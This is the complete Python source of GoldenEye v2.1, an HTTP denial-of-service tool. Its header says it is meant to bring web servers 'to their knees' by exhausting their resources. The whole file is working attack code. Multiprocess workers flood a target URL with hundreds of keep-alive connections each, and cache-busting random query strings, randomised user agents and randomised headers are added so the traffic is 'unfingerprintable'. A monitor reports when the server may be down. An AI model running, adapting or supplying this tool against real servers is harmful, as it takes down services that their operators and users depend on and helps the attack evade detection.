#!/usr/bin/env python3

"""
$Id: $

     /$$$$$$            /$$       /$$                     /$$$$$$$$
    /$$__  $$          | $$      | $$                    | $$_____/
   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$
   | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
   | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
   | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
   |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
    \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
                                                                     /$$  | $$
                                                                    |  $$$$$$/
                                                                     \______/


This tool is a dos tool that is meant to put heavy load on HTTP servers
in order to bring them to their knees by exhausting the resource pool.

This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.

@author Jan Seidl <http://wroot.org/>

@date 2014-02-18
@version 2.1

@TODO Test in python 3.x

LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""

from multiprocessing import Process, Manager, Pool
import urllib.parse, ssl
import sys, getopt, time
import http.client
import secrets

HTTPCLIENT = http.client

####
# Config
####
DEBUG = False
SSLVERIFY = True

####
# Constants
####
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500

GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (secrets.SystemRandom().randint(10, 11), secrets.SystemRandom().randint(0, 9), secrets.SystemRandom().randint(0, 5)) for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (secrets.SystemRandom().randint(535, 537), secrets.SystemRandom().randint(1,36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (secrets.SystemRandom().randint(6, 32), secrets.SystemRandom().randint(100, 2000), secrets.SystemRandom().randint(0, 100), secrets.SystemRandom().randint(535, 537), secrets.SystemRandom().randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (secrets.SystemRandom().randint(4, 6), secrets.SystemRandom().randint(0, 1), secrets.SystemRandom().randint(0, 9), secrets.SystemRandom().randint(535, 537), secrets.SystemRandom().randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (secrets.SystemRandom().randint(1, 3), secrets.SystemRandom().randint(0, 5), secrets.SystemRandom().randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (secrets.SystemRandom().randint(2001, 2010), secrets.SystemRandom().randint(1,31), secrets.SystemRandom().randint(1,12) , secrets.SystemRandom().randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}

####
# GoldenEye Class
####

class GoldenEye(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):
        """Initializes the Manager and Counters for the provided URL.
        Parameters:
            - url (str): The URL to be initialized.
        Returns:
            - None: This function does not return anything.
        Processing Logic:
            - Set URL
            - Initialize Manager
            - Initialize Counters"""
        

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))


    def exit(self):
        """Shuts down the GoldenEye system and prints a message to confirm the shutdown.
        Parameters:
            - self (object): The GoldenEye system object.
        Returns:
            - None: Does not return any value.
        Processing Logic:
            - Calls the stats() method.
            - Prints a shutdown message."""
        
        self.stats()
        print("Shutting down GoldenEye")

    def __del__(self):
        """Function: __del__
        Deletes an instance of the class.
        Parameters:
            - self (object): The instance of the class to be deleted.
        Returns:
            - None: This function does not return anything.
        Processing Logic:
            - Calls the exit() method.
            - Deletes the instance.
            - Automatically called when the instance is destroyed."""
        
        self.exit()

    def printHeader(self):
        """Prints a banner to the console.
        Parameters:
            - self (object): The object that calls the function.
        Returns:
            - None: Does not return any value.
        Processing Logic:
            - Prints a banner to the console.
            - Uses the GOLDENEYE_BANNER variable.
            - No parameters are required.
            - Does not return any value."""
        

        # Taunt!
        print()
        print(GOLDENEYE_BANNER)
        print()

    # Do the fun!
    def fire(self):
        """Fires multiple workers to hit a webserver with a specified number of connections each.
        Parameters:
            - self (object): The object itself.
            - param1 (string): The method used to hit the webserver.
            - param2 (int): The number of workers to start.
        Returns:
            - None: Does not return anything.
        Processing Logic:
            - Print the header.
            - Print the webserver information.
            - Start the specified number of workers.
            - Start the monitor."""
        

        self.printHeader()
        print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets))

        if DEBUG:
            print("Starting {0} concurrent workers".format(self.nr_workers))

        # Start workers
        for i in range(int(self.nr_workers)):

            try:

                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except Exception:
                error("Failed to start worker {0}".format(i))
                pass

        if DEBUG:
            print("Initiating monitor")
        self.monitor()

    def stats(self):
        """Function: stats(self)
        Parameters:
            - self (object): The object containing the counters and last counters.
        Returns:
            - None: This function does not return any value.
        Processing Logic:
            - Prints the number of successful and failed GoldenEye strikes.
            - Checks if the server may be down based on the counters.
            - Updates the last counters with the current counters."""
        

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print("{0} GoldenEye strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print("\tServer may be DOWN!")

                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except Exception:
            pass # silently ignore

    def monitor(self):
        """"""
        
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print("Killing worker {0}".format(worker.name))
                        #worker.terminate()
                        worker.stop()
                    except Exception:
                        pass # silently ignore
                if DEBUG:
                    raise
                else:
                    pass

####
# Striker Class
####

class Striker(Process):


    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):
        """"""
        

        super(Striker, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urllib.parse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443


        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'
            ]


    def __del__(self):
        """"""
        
        self.stop()


    #builds random ascii string
    def buildblock(self, size):
        """"""
        
        out_str = ''

        _LOWERCASE = list(range(97, 122))
        _UPPERCASE = list(range(65, 90))
        _NUMERIC   = list(range(48, 57))

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = secrets.SystemRandom().choice(validChars)
            out_str += chr(a)

        return out_str


    def run(self):
        """"""
        

        if DEBUG:
            print("Starting worker {0}".format(self.name))

        while self.runnable:

            try:

                for i in range(self.nr_socks):

                    if self.ssl:
                        if SSLVERIFY:
                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                        else:
                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:

                    (url, headers) = self.createPayload()

                    method = secrets.SystemRandom().choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:

                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()

            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass # silently ignore

        if DEBUG:
            print("Worker {0} completed run. Sleeping...".format(self.name))

    def closeConnections(self):
        """"""
        
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass # silently ignore


    def createPayload(self):
        """"""
        

        req_url, headers = self.generateData()

        random_keys = list(headers.keys())
        secrets.SystemRandom().shuffle(random_keys)
        random_headers = {}

        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount = 1):
        """"""
        

        queryString = []

        for i in range(ammount):

            key = self.buildblock(secrets.SystemRandom().randint(3,10))
            value = self.buildblock(secrets.SystemRandom().randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return '&'.join(queryString)


    def generateData(self):
        """"""
        

        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()


        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner = '?'):
        """"""
        

        return self.url + param_joiner + self.generateQueryString(secrets.SystemRandom().randint(1,5))

    def getUserAgent(self):
        """"""
        

        if self.useragents:
            return secrets.SystemRandom().choice(self.useragents)

        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0" # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][secrets.SystemRandom().choice(list(USER_AGENT_PARTS['os'].keys()))]
        os_name = secrets.SystemRandom().choice(os['name'])
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][secrets.SystemRandom().choice(list(USER_AGENT_PARTS['platform'].keys()))]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = secrets.SystemRandom().choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (secrets.SystemRandom().choice(browser['ext_pre']), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, secrets.SystemRandom().choice(browser['ext_post']))


        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, secrets.SystemRandom().choice(os['ext']))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, secrets.SystemRandom().choice(platform['name']))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (ua_string, secrets.SystemRandom().choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, secrets.SystemRandom().choice(platform['extensions']))

        return ua_string

    def generateRandomHeaders(self):
        """"""
        

        # Random no-cache entries
        noCacheDirectives = ['no-cache', 'max-age=0']
        secrets.SystemRandom().shuffle(noCacheDirectives)
        nrNoCache = secrets.SystemRandom().randint(1, (len(noCacheDirectives)-1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        # Random accept encoding
        acceptEncoding = ['\'\'','*','identity','gzip','deflate']
        secrets.SystemRandom().shuffle(acceptEncoding)
        nrEncodings = secrets.SystemRandom().randint(1,int(len(acceptEncoding)/2))
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': secrets.SystemRandom().randint(1,1000),
            'Host': self.host,
        }

        # Randomly-added headers
        # These headers are optional and are
        # randomly sent thus making the
        # header count random and unfingerprintable
        if secrets.SystemRandom().randrange(2) == 0:
            # Random accept-charset
            acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]
            secrets.SystemRandom().shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(secrets.SystemRandom().random(), 1), round(secrets.SystemRandom().random(), 1))

        if secrets.SystemRandom().randrange(2) == 0:
            # Random Referer
            url_part = self.buildblock(secrets.SystemRandom().randint(5,10))

            random_referer = secrets.SystemRandom().choice(self.referers) + url_part

            if secrets.SystemRandom().randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(secrets.SystemRandom().randint(1, 10))

            http_headers['Referer'] = random_referer

        if secrets.SystemRandom().randrange(2) == 0:
            # Random Content-Trype
            http_headers['Content-Type'] = secrets.SystemRandom().choice(['multipart/form-data', 'application/x-url-encoded'])

        if secrets.SystemRandom().randrange(2) == 0:
            # Random Cookie
            http_headers['Cookie'] = self.generateQueryString(secrets.SystemRandom().randint(1, 5))

        return http_headers

    # Housekeeping
    def stop(self):
        """"""
        
        self.runnable = False
        self.closeConnections()
        self.terminate()

    # Counter Functions
    def incCounter(self):
        """"""
        
        try:
            self.counter[0] += 1
        except Exception:
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except Exception:
            pass



####

####
# Other Functions
####

def usage():
    print()
    print('-----------------------------------------------------------------------------------------------------------')
    print()
    print(GOLDENEYE_BANNER)
    print()
    print(' USAGE: ./goldeneye.py <url> [OPTIONS]')
    print()
    print(' OPTIONS:')
    print('\t Flag\t\t\tDescription\t\t\t\t\t\tDefault')
    print('\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)')
    print('\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS))
    print('\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS))
    print('\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)')
    print('\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)')
    print('\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)')
    print('\t -h, --help\t\tShows this help')
    print()
    print('-----------------------------------------------------------------------------------------------------------')


def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)

####
# Main
####

def main():

    try:

        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url == None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-n", "--nosslcheck"):
                global SSLVERIFY
                SSLVERIFY = False
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '"+o+"' doesn't exists")


        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except EnvironmentError:
                error("cannot read file {0}".format(uas_file))

        goldeneye = GoldenEye(url)
        goldeneye.useragents = useragents
        goldeneye.nr_workers = workers
        goldeneye.method = method
        goldeneye.nr_sockets = socks

        goldeneye.fire()

    except getopt.GetoptError as err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()
